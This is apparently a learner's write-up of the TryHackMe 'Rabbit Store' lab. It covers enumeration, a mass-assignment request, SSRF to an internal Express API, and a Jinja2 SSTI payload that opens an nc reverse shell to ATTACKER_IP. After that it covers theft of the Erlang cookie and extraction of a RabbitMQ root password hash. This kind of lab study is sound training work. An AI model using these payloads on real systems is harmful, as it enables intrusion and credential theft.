# Rabbit Store Writeup

*Demonstrate your web application testing skills and the basics of Linux to escalate your privileges.*

On my journey to pass the PT1, I am going through every recommended learning room. I have just completed the Jr Pentester Pathway, and am now looking to do some more challenge rooms. I still have to learn how to attack Active Directory, so I'm skipping those challenges for now. This room will focus on web application testing.

**Update after finishing:** This challenge was tough. Probably one of the hardest rooms I've done so far. I was hoping I could figure out more on my own, but ended up needing to look at some other walkthroughs to help me along the way. Still, I learned a ton from this room, such as mass assignment vulnerability, exploiting rabbitmq, intercepting HTTP requests with Caido, and just generally better ways to improve my hacking methodology. I'd like to give a big shoutout to [jaxafed,]([TryHackMe: Rabbit Store | jaxafed](https://jaxafed.github.io/posts/tryhackme-rabbit_store/)) their walkthrough helped me immensely, and is one of the most well formatted walkthroughs I've come across.

## Hosts File

It's important to add these entries to your hosts file in order to properly access the website.

* `nano /etc/hosts`

* ```
  MACHINE_IP cloudsite.thm
  MACHINE_IP storage.cloudsite.thm
  ```

## Enumeration/OSINT

First, let's start with an aggressive nmap scan. 

```bash
nmap -A -p- cloudsite.thm
```

![nmap](/home/z/Documents/Rabbit_Store/rabbit_assets/nmap.png)

Interesting we found:

* 22 (ssh)

* 80 (web server)

* 4369 (Erlang Port Mapper Daemon)

* 25672 (unknown)

We'll keep this in mind for later, let's check out the website.

Navigate to `http://cloudsite.thm`:

![cloudsite](/home/z/Documents/Rabbit_Store/rabbit_assets/cloudsite.png)

Looking in the **About Us** section we find some names that might be useful later.

![about_us](/home/z/Documents/Rabbit_Store/rabbit_assets/about_us.png)

Some other potentially interesting information at the bottom of the page (emails, phone numbers, and stack tags).

![about_us_2](/home/z/Documents/Rabbit_Store/rabbit_assets/about_us_2.png)

Some other emails in the **Contact Us** section.

![contact_us](/home/z/Documents/Rabbit_Store/rabbit_assets/contact_us.png)

The login page is semi-interesting, as its hosted on a different subdomain.

![login](/home/z/Documents/Rabbit_Store/rabbit_assets/login_page.png)

I tested creating a user account and was met with this message.

![user_test](/home/z/Documents/Rabbit_Store/rabbit_assets/user_test.png)

A quick check with Wappalyzer shows this tech stack.

![wappalyzer](/home/z/Documents/Rabbit_Store/rabbit_assets/wappalyzer.png)

Now let's do some more enumeration.

Run Gobuster on the two domains we know of:

```bash
gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -u cloudsite.thm -b 403,404
```

I filtered out 403 and 404 responses to make the screenshot more clean.

![gobuster_1](/home/z/Documents/Rabbit_Store/rabbit_assets/gobuster_1.png)

The /assets and /javascript could be interesting.

Now we run Gobuster on the subdomain.

```bash
gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -u storage.cloudsite.thm -b 403,404
```

![gobuster_2](/home/z/Documents/Rabbit_Store/rabbit_assets/gobuster_2.png)

Some more interesting directories.

Quick check for other subdomains.

```bash
gobuster dns -d cloudsite.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

![gobuster_3](/home/z/Documents/Rabbit_Store/rabbit_assets/gobuster_3.png)

Nothing.

## Looking for a Way In

That was a lot of information, now we need to figure out how to use it.

I decided to start by capturing a login request with Caido:

![caido_1](/home/z/Documents/Rabbit_Store/rabbit_assets/caido_1.png)

The JWT is quite interesting. I took the JWT and used jwt.io to decode it. I messed around with the payload for a while and tried to test if I could access the /dashboard/active page by foraging a token that had `"alg": "none"` but this didn't work. It checks for a secret key, and bypassing that wasn't possible. I figured this was a bit of a rabbit hole so I chose to move on for now.

I then tried some basic SQLi and brute forcing on the login page, when I realized I was probably overthinking this. I went back to look at my nmap scan from earlier, and took a closer look at the Erlang Port Mapper Daemon. And thats when I saw it. 

![rabbit](/home/z/Documents/Rabbit_Store/rabbit_assets/rabbit.png)

nodes:

    rabbit: 25672

The title of the room... rabbit store. Not sure how I missed this earlier, but this had to be a hint towards the way in. After some research into Erlang Port Mapper Daemon I found out that there's an RCE vulnerability that can be exploited, and there's even a metasploit module for it. Only problem is, we need an erlang cookie first.

So back to trying to get an authenticated account. After some more research I realized that it was a lot more simple than trying to forge the JWT. 

![mass_assignment](/home/z/Documents/Rabbit_Store/rabbit_assets/subscribed.png)

Turns out we need to exploit a [mass assignment]([Mass assignment vulnerability - Wikipedia](https://en.wikipedia.org/wiki/Mass_assignment_vulnerability)) vulnerability. Essentially, we add the subscription field to the registration request, and set it to active. Now we login to the new account we created, and we have an active subscription.

```http
POST /api/register HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://storage.cloudsite.thm/register.html
Content-Type: application/json
Content-Length: 46
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Priority: u=0

{
    "email":"hello@hello.com",
    "password":"hello",
    "subscription":"active"
}
```

Now we have an account with an active subscription, allowing us to view the authorized portal.

![file_upload](/home/z/Documents/rabbit_assets/file_upload.png)

Upon logging in to our active account, we're presented with this page. Time to upload a reverse shell, or so I hope. 

First I checked the page source for any clues on how the upload function processed files. Nothing too interesting.

![extensions_removed](/home/z/Documents/Rabbit_Store/rabbit_assets/extensions_removed.png)

File extensions are removed for security reasons. Hmm. This might be harder than expected. 

But we also have an alternate method for uploading files.

![url_upload](/home/z/Documents/Rabbit_Store/rabbit_assets/upload_from_url.png)

I created a simple file named test.txt with the word test in it. Then I spun up a python web server.

```bash
python3 -m http.server
```

![test1](/home/z/Documents/Rabbit_Store/rabbit_assets/test1.png)

Successful upload. Now let's try again and capture the request in Caido this time. I accidentally forgot to queue the request on "test2.txt" so that's why it goes from "test.txt" to "test3.txt".

```http
POST /api/store-url HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://storage.cloudsite.thm/dashboard/active
Content-Type: application/json
Content-Length: 44
Origin: http://storage.cloudsite.thm
Connection: keep-alive
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImhlbGxvQGhlbGxvLm5ldCIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc1MDk4MzY2OCwiZXhwIjoxNzUwOTg3MjY4fQ.QP6J3MKmdtvbZwY47awdv9yMT2UNbAOCq22nc06AVTA
Priority: u=0

{"url":"http://10.10.99.111:8000/test3.txt"}
```

Some further enumeration on /api shows:

```bash
gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -u storage.cloudsite.thm/api/
```

![api](/home/z/Documents/Rabbit_Store/rabbit_assets/api_fuzz.png)

If we try a GET request on the /api/docs endpoint we receive an access denied.

```http
HTTP/1.1 403 Forbidden
Date: Fri, 27 Jun 2025 00:54:48 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 27
ETag: W/"1b-iBx/SnAbP76moSKyn7jijRK2KE8"
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{
    "message": "Access denied"
}
```

But in the `X-Powered-By` header we see `Express`. What is Express? Express is a web application framework for Node.js, which is used to build web servers and APIs. Knowing this we can attempt to access the endpoint directly instead of dealing with the Apache server. We can do this by accessing `http://127.0.0.1:3000/api/docs` (Port 3000 is the default port for Express).

![upload_docs](/home/z/Documents/Rabbit_Store/rabbit_assets/upload_docs.png)

Now we retrieve the file we uploaded.

![docs](/home/z/Documents/Rabbit_Store/rabbit_assets/docs.png)

We get some juicy information.

```http
HTTP/1.1 200 OK
Date: Fri, 27 Jun 2025 01:10:45 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 27 Jun 2025 01:10:31 GMT
ETag: W/"233-197aeefa9ec"
Content-Type: application/octet-stream
Content-Length: 563
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.

```

"/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future". Seems like a good place to check out. 

At this point I also had to relogin as it seemed my session expired.

We send a POST request to the new chatbot endpoint.

```http
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://storage.cloudsite.thm/dashboard/active
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImhlbGxvQGhlbGxvLm5ldCIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc1MDk4NzQ0MSwiZXhwIjoxNzUwOTkxMDQxfQ.Y73lqTnN6H4-iflbz4Do8mLv8wORPd0A7r_XRTB03tI
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-type: application/json;charset=UTF-8
Content-length: 15

{
  "":""
}
```

![chatbot](/home/z/Documents/Rabbit_Store/rabbit_assets/chatbot.png)

```json
{
    "error": "username parameter is required"
}
```

That's no problem.

```http
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://storage.cloudsite.thm/dashboard/active
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImhlbGxvQGhlbGxvLm5ldCIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc1MDk4NzQ0MSwiZXhwIjoxNzUwOTkxMDQxfQ.Y73lqTnN6H4-iflbz4Do8mLv8wORPd0A7r_XRTB03tI
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-type: application/json;charset=UTF-8
Content-length: 20

{
  "username":"admin"
}
```

We get a response this time.

![sorry](/home/z/Documents/Rabbit_Store/rabbit_assets/sorry.png)

We can see that our username is reflected in the response. This could indicate SSTI. Server-Side Template Injection is a vulnerability that occurs when user input is unsafely inserted into a server-side template and gets interpreted as code. This allows an attacker to inject and execute arbitrary code on the server, often leading to remote code execution (RCE).

We can test for this using an SSTI polyglot payload. A polyglot SSTI payload is a single payload designed to work across multiple template engines, triggering server-side template injection (SSTI) regardless of the specific backend used (e.g., Jinja2, Twig, ERB, etc.).

```json
{"username":"${{<%[%'\"}}%\\."}
```

![polyglot](/home/z/Documents/Rabbit_Store/rabbit_assets/polyglot.png)

This causes an error on the Jinja2 templating engine. We can now attempt to exploit this SSTI to gain RCE, using the following payload:

```json
{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 443 >/tmp/f').read() }}"}
```

We first need to start a listener.

```bash
nc -lvnp 443
```

```http
POST /api/fetch_messeges_from_chatbot HTTP/1.1
Host: storage.cloudsite.thm
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://storage.cloudsite.thm/dashboard/active
Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImhlbGxvQGhlbGxvLm5ldCIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc1MDk4NzQ0MSwiZXhwIjoxNzUwOTkxMDQxfQ.Y73lqTnN6H4-iflbz4Do8mLv8wORPd0A7r_XRTB03tI
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-type: application/json;charset=UTF-8
Content-length: 20

{"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.99.111 443 >/tmp/f').read() }}"}

```

![revshell](/home/z/Documents/Rabbit_Store/rabbit_assets/revshell.png)

And we have revshell. Since we know we're looking for "user.txt" we can use the find command.

```bash
find / -name "user.txt" 2>/dev/null
```

I'm not going to show the flag here, sorry.

## Privilege Escalation

Now from earlier we know that we need to find the Erlang cookie. But first let's upgrade/stabilize our shell. These are the steps I used.

1. The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
2. Step two is: `export TERM=xterm` -- this will give us access to term commands such as `clear`.
3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.



After a quick search I saw that the erlang cookie is typically stored in `/var/lib/rabbitmq/.erlang.cookie`

And sure enough `cat /var/lib/rabbitmq/.erlang.cookie` provided the necessary cookie.

![cookie](/home/z/Documents/Rabbit_Store/rabbit_assets/cookie.png)

I had a little issue with the output lacking a trailing newline, so I used a little workaround to display it nicely. 

First we need to add the RabbitMQ hostname to our /etc/hosts

`VICTIM_IP cloudsite.thm storage.cloudsite.thm forge`

Then we install the rabbitmq management package.

```bash
sudo apt-get update
```

```bash
sudo apt install -y rabbitmq-server
```

Now we use the rabbitmqctl (used to manage rabbitmq nodes)  to enumerate the RabbitMQ instance.

```bash
sudo rabbitmqctl --erlang-cookie 'OrBZItrpGHLcMZbP' --node rabbit@forge status
```

![mqctl](/home/z/Documents/Rabbit_Store/rabbit_assets/mqctl1.png)

```bash
Status of node rabbit@forge ...
Runtime

OS PID: 1144
OS: Linux
Uptime (seconds): 15982
RabbitMQ version: 3.9.13
Node name: rabbit@forge
Erlang configuration: Erlang/OTP 24 [erts-12.2.1] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit]
Erlang processes: 437 used, 1048576 limit
Scheduler run queue: 1
Cluster heartbeat timeout (net_ticktime): 60

Plugins

Enabled plugin file: /etc/rabbitmq/enabled_plugins
Enabled plugins:

 * rabbitmq_management
 * amqp_client
 * rabbitmq_web_dispatch
 * cowboy
 * cowlib
 * rabbitmq_management_agent

Data directory

Node data directory: /var/lib/rabbitmq/mnesia/rabbit@forge

Config files

 * /etc/rabbitmq/rabbitmq.conf

Log file(s)

 * /var/log/rabbitmq/rabbit@forge.log
 * /var/log/rabbitmq/rabbit@forge_upgrade.log
 * <stdout>

```

Further enumeration:

```bash
sudo rabbitmqctl --erlang-cookie 'OrBZItrpGHLcMZbP' --node rabbit@forge list_users
```

![rabbit_users](/home/z/Documents/Rabbit_Store/rabbit_assets/rabbit_users.png)

```bash
root@ip-10-10-99-111:~/temp# sudo rabbitmqctl --erlang-cookie 'OrBZItrpGHLcMZbP' --node rabbit@forge list_users
Listing users ...
user	tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.	[]
root	[administrator]

```

"The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256."

We can export this hash by doing:

```bash
sudo rabbitmqctl --erlang-cookie 'OrBZItrpGHLcMZbP' --node rabbit@forge export_definitions /tmp/definitions.json
```

<img src="file:///home/z/Documents/Rabbit_Store/rabbit_assets/hash_export.png" title="" alt="hash_export" width="680">

```bash
root@ip-10-10-99-111:~/temp# sudo rabbitmqctl --erlang-cookie 'OrBZItrpGHLcMZbP' --node rabbit@forge export_definitions /tmp/definitions.json
Exporting definitions in JSON to a file at "/tmp/definitions.json" ...The hash we are given is in base64 and follows this format:
```

Using this command makes the part we're looking for easy to view:

```bash
cat /tmp/definitions.json | jq '.users[] | select(.name == "root")'
```

This is the redacted output:

```bash
root@ip-10-10-99-111:~/temp# cat /tmp/definitions.json | jq '.users[] | select(.name == "root")'
{
  "hashing_algorithm": "rabbit_password_hashing_sha256",
  "limits": {},
  "name": "root",
  "password_hash": "49e6hSldHRa[...]tGU+YBzWF",
  "tags": [
    "administrator"
  ]
}
```

The structure if the hash is:

`base64(<4 byte salt> + sha256(<4 byte salt> + <password>))`

Convert the base64 hash to hex:

```bash
echo -n '49e6hSldHRa[...]tGU+YBzWF' | base64 -d | xxd -p -c 100
```

We get the result:

`e3d7ba85295d1d16a2617df[...]614811ed194f98073585`

Now we need to remove the 4 byte salt at the beginning.

`e3d7ba85`

`295d1d16a2617df[...]614811ed194f98073585`

We now have the password for the root user!

Quickly search for the flag:

```bash
find / -name "root.txt" 2>/dev/null
```

```bash
root@forge:/home/azrael/chatbotServer# find / -name "root.txt" 2>/dev/null
/root/root.txt
```

And that's the room complete. Thanks for reading if you got this far. Again, highly recommend looking at [jaxafed's]([TryHackMe: Rabbit Store | jaxafed](https://jaxafed.github.io/posts/tryhackme-rabbit_store/)) walkthrough, it's extremely well put together and I could not have completed this without it.


